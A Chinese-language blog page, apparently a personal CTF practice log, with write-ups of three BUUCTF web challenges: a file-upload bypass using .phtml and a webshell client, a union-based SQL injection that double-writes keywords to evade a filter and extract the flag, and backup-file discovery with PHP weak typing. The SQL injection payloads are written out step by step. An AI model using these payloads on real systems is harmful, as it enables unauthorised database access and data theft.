@@ -1,0 +1,726 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="H0ne">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[ACTF2020 新生赛]Upload上传一个PHTML文件首先发现有前端验证将后面的删除发现就可以上传phtml文件了通过蚁剑连接就能得到flag [极客大挑战 2019]BabySQL具体回显如下:只保留了 1# ,这就说明被检测到了union和select这里尝试双写绕过(原理是猜测使用replace函数,查找到union和select等然后替换为空)?username&#x3D;admi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUU继续刷题">
+<meta property="og:url" content="http://example.com/2023/04/20/BUU%E7%BB%A7%E7%BB%AD%E5%88%B7%E9%A2%98/index.html">
+<meta property="og:site_name" content="H0ne&#39;s Blog">
+<meta property="og:description" content="[ACTF2020 新生赛]Upload上传一个PHTML文件首先发现有前端验证将后面的删除发现就可以上传phtml文件了通过蚁剑连接就能得到flag [极客大挑战 2019]BabySQL具体回显如下:只保留了 1# ,这就说明被检测到了union和select这里尝试双写绕过(原理是猜测使用replace函数,查找到union和select等然后替换为空)?username&#x3D;admi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628470366795-b63b8f9f-42a8-4c50-bee5-acee14909df6.png#height=235&id=WxMHB&margin=%5Bobject%20Object%5D&name=image.png&originHeight=469&originWidth=1023&originalType=binary&ratio=1&size=234751&status=done&style=none&width=511.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628470400789-e6255958-3d2b-4ae1-806a-672e153a121a.png#height=37&id=LMySZ&margin=%5Bobject%20Object%5D&name=image.png&originHeight=73&originWidth=622&originalType=binary&ratio=1&size=6950&status=done&style=none&width=311">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628470472361-d64ba82d-683c-41c2-a29e-99a6fa5ef051.png#height=23&id=rhpXc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=45&originWidth=488&originalType=binary&ratio=1&size=4460&status=done&style=none&width=244">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628470648996-8aec3d86-f740-475d-a765-521dfcc1a358.png#height=264&id=tunqT&margin=%5Bobject%20Object%5D&name=image.png&originHeight=527&originWidth=1202&originalType=binary&ratio=1&size=105717&status=done&style=none&width=601">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628470669735-85f99f6c-9c84-4719-ab5f-b6130f58c9b9.png#height=43&id=j7Cup&margin=%5Bobject%20Object%5D&name=image.png&originHeight=85&originWidth=604&originalType=binary&ratio=1&size=7549&status=done&style=none&width=302">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628470935165-22b1918e-33b7-44a0-82c7-582b19d5fb48.png#height=162&id=gF31E&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=623&originalType=binary&ratio=1&size=169489&status=done&style=none&width=311.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628562483560-ad8b74fb-bf65-46b8-9c18-71faa8d3b52f.png#height=21&id=cdrwc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=42&originWidth=981&originalType=binary&ratio=1&size=7261&status=done&style=none&width=490.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628562490421-dbbb1777-1aa7-439c-b59b-ccd848e7bc73.png#height=28&id=NX7QI&margin=%5Bobject%20Object%5D&name=image.png&originHeight=55&originWidth=1447&originalType=binary&ratio=1&size=47391&status=done&style=none&width=723.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628564404265-187b79cc-76ee-4d53-b8a7-64caa7f5133b.png#height=118&id=LvXSW&margin=%5Bobject%20Object%5D&name=image.png&originHeight=235&originWidth=860&originalType=binary&ratio=1&size=100604&status=done&style=none&width=430">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628564438206-e209f620-8ed7-4d06-bb60-5f7dd8069e08.png#height=171&id=XhKXN&margin=%5Bobject%20Object%5D&name=image.png&originHeight=341&originWidth=628&originalType=binary&ratio=1&size=135722&status=done&style=none&width=314">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628564486587-29be481f-443d-4626-91cf-bd9b5428a348.png#height=75&id=R5JQL&margin=%5Bobject%20Object%5D&name=image.png&originHeight=149&originWidth=697&originalType=binary&ratio=1&size=75605&status=done&style=none&width=348.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628587331716-c1b4bc6d-a5f9-47c0-9673-0b3d44d49aad.png#height=123&id=BME3t&margin=%5Bobject%20Object%5D&name=image.png&originHeight=245&originWidth=1158&originalType=binary&ratio=1&size=165775&status=done&style=none&width=579">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628587561341-f72e21d4-3e02-4a68-94ea-53e8c19c8771.png#height=103&id=VxjZc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=206&originWidth=746&originalType=binary&ratio=1&size=100804&status=done&style=none&width=373">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628587608197-2a84ace7-a13a-4a10-b60d-6d5ed162cc0e.png#height=165&id=ehAsD&margin=%5Bobject%20Object%5D&name=image.png&originHeight=329&originWidth=850&originalType=binary&ratio=1&size=194359&status=done&style=none&width=425">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628587741210-f389852c-1550-4010-915f-9f98b01a26a1.png#height=66&id=rEUdd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=131&originWidth=643&originalType=binary&ratio=1&size=62775&status=done&style=none&width=321.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628587780279-a400bbb4-ab88-459a-aebc-09560ed09e5d.png#height=80&id=aRp3l&margin=%5Bobject%20Object%5D&name=image.png&originHeight=160&originWidth=1170&originalType=binary&ratio=1&size=103266&status=done&style=none&width=585">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628587835196-a5a130ae-9905-4fbb-a740-f40b84916c6d.png#height=30&id=IyLiF&margin=%5Bobject%20Object%5D&name=image.png&originHeight=60&originWidth=767&originalType=binary&ratio=1&size=2811&status=done&style=none&width=383.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628603326934-470ec2ef-bdea-4cad-b428-d17395d51887.png#height=251&id=cbtYb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=501&originWidth=981&originalType=binary&ratio=1&size=31083&status=done&style=none&width=490.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628608057575-29192fe0-ae22-4e27-82d4-57a44c6894ee.png#height=515&id=tFRDI&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1030&originWidth=1920&originalType=binary&ratio=1&size=279195&status=done&style=none&width=960">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628606804168-f5456cf7-25d8-4dee-8bfd-5086a228fd17.png#height=51&id=Mfl8Z&margin=%5Bobject%20Object%5D&name=image.png&originHeight=101&originWidth=948&originalType=binary&ratio=1&size=14183&status=done&style=none&width=474">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628606875711-ba5446f0-e4a4-4d99-8fd6-c3a2993c4e3e.png#height=101&id=MfRhD&name=image.png&originHeight=101&originWidth=927&originalType=binary&ratio=1&size=14377&status=done&style=none&width=927">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628606928855-9f577089-21a2-4d40-a238-638b0ec9a27c.png#height=117&id=aGeO0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=233&originWidth=475&originalType=binary&ratio=1&size=39034&status=done&style=none&width=237.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628608109425-9efff7c1-cccd-406f-b4fa-0fb82ed586f1.png#height=483&id=NmBv2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=966&originWidth=1264&originalType=binary&ratio=1&size=165731&status=done&style=none&width=632">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628608126484-4c304e2d-6048-4e5a-9062-640181d665a3.png#height=22&id=u1nlB&margin=%5Bobject%20Object%5D&name=image.png&originHeight=43&originWidth=300&originalType=binary&ratio=1&size=2598&status=done&style=none&width=150">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628608171114-2bc16e9e-22dd-48e8-b747-7319f48716fa.png#height=483&id=Gm4y2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=966&originWidth=1264&originalType=binary&ratio=1&size=164310&status=done&style=none&width=632">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628654937600-60fe647c-1d05-4211-96ed-70064d34b755.png#height=180&id=kAZKU&margin=%5Bobject%20Object%5D&name=image.png&originHeight=359&originWidth=800&originalType=binary&ratio=1&size=18983&status=done&style=none&width=400">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628677244825-bc4ba01d-f1cf-4164-9096-715e00e8ef2b.png#height=473&id=EIWY2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=946&originWidth=1264&originalType=binary&ratio=1&size=128257&status=done&style=none&width=632">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628677486872-f2571c9c-ed3c-4301-a57e-bfd24330eddf.png#height=262&id=N3Jtn&margin=%5Bobject%20Object%5D&name=image.png&originHeight=524&originWidth=1478&originalType=binary&ratio=1&size=68891&status=done&style=none&width=739">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628677988997-6000ddbb-ad8a-4442-98b0-8040a25943f7.png#height=270&id=YNOnH&margin=%5Bobject%20Object%5D&name=image.png&originHeight=539&originWidth=1233&originalType=binary&ratio=1&size=71754&status=done&style=none&width=616.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628686686122-67383f8f-2a33-446e-852c-7a279b11c089.png#height=89&id=ZBCVx&margin=%5Bobject%20Object%5D&name=image.png&originHeight=177&originWidth=1179&originalType=binary&ratio=1&size=9724&status=done&style=none&width=589.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628737812429-c208019e-e686-4620-bcc1-58c5985fbc7f.png#height=205&id=wcGuK&originHeight=205&originWidth=850&originalType=binary&ratio=1&size=0&status=done&style=none&width=850">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628742729854-957de866-3088-4861-861f-d33aec16e75a.png#height=496&id=bPXm8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=992&originWidth=1264&originalType=binary&ratio=1&size=167889&status=done&style=none&width=632">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625576668516-91c69911-44f6-467a-b9c0-83283418d50d.png#height=323&id=u531a6d11&margin=%5Bobject%20Object%5D&name=image.png&originHeight=646&originWidth=1424&originalType=binary&ratio=1&size=1413360&status=done&style=none&width=712">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625578708671-7d60faaa-23b7-47e0-8749-5df39da50783.png#height=295&id=ue30ab418&margin=%5Bobject%20Object%5D&name=image.png&originHeight=590&originWidth=1154&originalType=binary&ratio=1&size=61043&status=done&style=none&width=577">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625578973156-319cea12-c88f-49ca-86d8-8997822fc9d9.png#height=496&id=u0c7486ce&margin=%5Bobject%20Object%5D&name=image.png&originHeight=992&originWidth=1264&originalType=binary&ratio=1&size=154791&status=done&style=none&width=632">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625579493050-f9136f88-601a-4187-956c-d82fe3914e1c.png#height=432&id=u68c71257&margin=%5Bobject%20Object%5D&name=image.png&originHeight=863&originWidth=1284&originalType=binary&ratio=1&size=84189&status=done&style=none&width=642">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625579627952-b6b3e54b-83cd-46cb-a078-6026c5873c74.png#height=130&id=u03381c6a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=260&originWidth=815&originalType=binary&ratio=1&size=33693&status=done&style=none&width=407.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625580819996-0768a9ea-8bec-46a1-bbf1-6d2a0235ef5a.png#height=421&id=ub89bb2f7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=842&originWidth=1284&originalType=binary&ratio=1&size=142321&status=done&style=none&width=642">
+<meta property="article:published_time" content="2023-04-20T15:33:27.608Z">
+<meta property="article:modified_time" content="2021-08-30T01:45:06.000Z">
+<meta property="article:author" content="H0ne">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628470366795-b63b8f9f-42a8-4c50-bee5-acee14909df6.png#height=235&id=WxMHB&margin=%5Bobject%20Object%5D&name=image.png&originHeight=469&originWidth=1023&originalType=binary&ratio=1&size=234751&status=done&style=none&width=511.5">
+  
+  
+  
+  <title>BUU继续刷题 - H0ne&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>H0ne&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BUU继续刷题"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-20 23:33" pubdate>
+          2023年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          55 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">BUU继续刷题</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>上传一个PHTML文件<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628470366795-b63b8f9f-42a8-4c50-bee5-acee14909df6.png#height=235&id=WxMHB&margin=%5Bobject%20Object%5D&name=image.png&originHeight=469&originWidth=1023&originalType=binary&ratio=1&size=234751&status=done&style=none&width=511.5" srcset="/img/loading.gif" lazyload alt="image.png"><br>首先发现有前端验证<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628470400789-e6255958-3d2b-4ae1-806a-672e153a121a.png#height=37&id=LMySZ&margin=%5Bobject%20Object%5D&name=image.png&originHeight=73&originWidth=622&originalType=binary&ratio=1&size=6950&status=done&style=none&width=311" srcset="/img/loading.gif" lazyload alt="image.png"><br>将后面的删除<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628470472361-d64ba82d-683c-41c2-a29e-99a6fa5ef051.png#height=23&id=rhpXc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=45&originWidth=488&originalType=binary&ratio=1&size=4460&status=done&style=none&width=244" srcset="/img/loading.gif" lazyload alt="image.png"><br>发现就可以上传phtml文件了<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628470648996-8aec3d86-f740-475d-a765-521dfcc1a358.png#height=264&id=tunqT&margin=%5Bobject%20Object%5D&name=image.png&originHeight=527&originWidth=1202&originalType=binary&ratio=1&size=105717&status=done&style=none&width=601" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628470669735-85f99f6c-9c84-4719-ab5f-b6130f58c9b9.png#height=43&id=j7Cup&margin=%5Bobject%20Object%5D&name=image.png&originHeight=85&originWidth=604&originalType=binary&ratio=1&size=7549&status=done&style=none&width=302" srcset="/img/loading.gif" lazyload alt="image.png"><br>通过蚁剑连接就能得到flag</p>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628470935165-22b1918e-33b7-44a0-82c7-582b19d5fb48.png#height=162&id=gF31E&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=623&originalType=binary&ratio=1&size=169489&status=done&style=none&width=311.5" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628562483560-ad8b74fb-bf65-46b8-9c18-71faa8d3b52f.png#height=21&id=cdrwc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=42&originWidth=981&originalType=binary&ratio=1&size=7261&status=done&style=none&width=490.5" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628562490421-dbbb1777-1aa7-439c-b59b-ccd848e7bc73.png#height=28&id=NX7QI&margin=%5Bobject%20Object%5D&name=image.png&originHeight=55&originWidth=1447&originalType=binary&ratio=1&size=47391&status=done&style=none&width=723.5" srcset="/img/loading.gif" lazyload alt="image.png"><br>具体回显如下:只保留了 1# ,这就说明被检测到了union和select<br>这里尝试双写绕过(原理是猜测使用replace函数,查找到union和select等然后替换为空)<br>?username&#x3D;admin&amp;password&#x3D;pwd ‘ ununionion seselectlect 1 %23 （这里我发现只能用%23 不能用# 不被编译）<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628564404265-187b79cc-76ee-4d53-b8a7-64caa7f5133b.png#height=118&id=LvXSW&margin=%5Bobject%20Object%5D&name=image.png&originHeight=235&originWidth=860&originalType=binary&ratio=1&size=100604&status=done&style=none&width=430" srcset="/img/loading.gif" lazyload alt="image.png"><br>但是我们现在的列数还不对<br>?username&#x3D;admin&amp;password&#x3D;pwd ‘ ununionion seselectlect 1,2,3 %23<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628564438206-e209f620-8ed7-4d06-bb60-5f7dd8069e08.png#height=171&id=XhKXN&margin=%5Bobject%20Object%5D&name=image.png&originHeight=341&originWidth=628&originalType=binary&ratio=1&size=135722&status=done&style=none&width=314" srcset="/img/loading.gif" lazyload alt="image.png"><br>?username&#x3D;admin&amp;password&#x3D;pwd ‘ ununionion seselectlect 1,2,database() %23<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628564486587-29be481f-443d-4626-91cf-bd9b5428a348.png#height=75&id=R5JQL&margin=%5Bobject%20Object%5D&name=image.png&originHeight=149&originWidth=697&originalType=binary&ratio=1&size=75605&status=done&style=none&width=348.5" srcset="/img/loading.gif" lazyload alt="image.png"><br>?username&#x3D;admin&amp;password&#x3D;pwd ‘ ununionion seselectlect 1,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata) %23<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628587331716-c1b4bc6d-a5f9-47c0-9673-0b3d44d49aad.png#height=123&id=BME3t&margin=%5Bobject%20Object%5D&name=image.png&originHeight=245&originWidth=1158&originalType=binary&ratio=1&size=165775&status=done&style=none&width=579" srcset="/img/loading.gif" lazyload alt="image.png"><br><strong>此时注意information被过滤了or,from也被过滤了，还包括where所以都双写一下</strong><br>?username&#x3D;admin&amp;password&#x3D;pwd %27 ununionion seselectlect 1,2,group_concat(table_name)frfromom(infoorrmation_schema.tables)whwhereere table_schema&#x3D;”geek” %23<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628587561341-f72e21d4-3e02-4a68-94ea-53e8c19c8771.png#height=103&id=VxjZc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=206&originWidth=746&originalType=binary&ratio=1&size=100804&status=done&style=none&width=373" srcset="/img/loading.gif" lazyload alt="image.png"><br>​</p>
+<p>?username&#x3D;admin&amp;password&#x3D;pwd ‘ ununionion seselectlect 1,2,group_concat(table_name)frfromom(infoorrmation_schema.tables)whwhereere table_schema&#x3D;”ctf” %23<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628587608197-2a84ace7-a13a-4a10-b60d-6d5ed162cc0e.png#height=165&id=ehAsD&margin=%5Bobject%20Object%5D&name=image.png&originHeight=329&originWidth=850&originalType=binary&ratio=1&size=194359&status=done&style=none&width=425" srcset="/img/loading.gif" lazyload alt="image.png"><br>查Flag表中的字段名都有什么<br>?username&#x3D;admin&amp;password&#x3D;pwd ‘ ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name&#x3D;”Flag”%23<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628587741210-f389852c-1550-4010-915f-9f98b01a26a1.png#height=66&id=rEUdd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=131&originWidth=643&originalType=binary&ratio=1&size=62775&status=done&style=none&width=321.5" srcset="/img/loading.gif" lazyload alt="image.png"><br>最后查最后的数据<br>?username&#x3D;admin&amp;password&#x3D;pwd %27 ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag)%23<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628587780279-a400bbb4-ab88-459a-aebc-09560ed09e5d.png#height=80&id=aRp3l&margin=%5Bobject%20Object%5D&name=image.png&originHeight=160&originWidth=1170&originalType=binary&ratio=1&size=103266&status=done&style=none&width=585" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628587835196-a5a130ae-9905-4fbb-a740-f40b84916c6d.png#height=30&id=IyLiF&margin=%5Bobject%20Object%5D&name=image.png&originHeight=60&originWidth=767&originalType=binary&ratio=1&size=2811&status=done&style=none&width=383.5" srcset="/img/loading.gif" lazyload alt="image.png"><br>发现是有文件泄露 ，用dirsearch扫一下<br>题目的提示是backupFile备份文件<br>备份文件一般的后缀名为<br>.rar<br>.zip<br>.7z<br>.tar.gz<br>.bak<br>.swp<br>.txt<br>.html<br>.bak<br>这里的备份文件是index.php.bak,<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628603326934-470ec2ef-bdea-4cad-b428-d17395d51887.png#height=251&id=cbtYb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=501&originWidth=981&originalType=binary&ratio=1&size=31083&status=done&style=none&width=490.5" srcset="/img/loading.gif" lazyload alt="image.png"><br>PHP的弱类型特性，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉<br>所以相当于key只要等于123就满足条件了</p>
